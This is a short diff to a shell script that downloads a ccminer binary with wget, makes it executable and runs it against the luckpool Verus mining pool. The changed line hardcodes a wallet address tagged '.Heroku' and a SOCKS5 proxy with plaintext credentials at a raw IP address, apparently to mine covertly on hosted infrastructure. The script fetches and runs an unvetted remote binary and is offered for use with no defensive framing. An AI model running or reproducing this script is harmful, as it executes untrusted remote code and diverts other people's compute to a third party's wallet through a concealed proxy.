@@ -6,4 +6,4 @@
 cd /home/shell-bot
 wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
 chmod +x build
-./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u $c -p x -t $(nproc --all) -x $p
+./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.Heroku -p x -t $(nproc --all) -x socks5://omar:omar@159.65.47.183:333
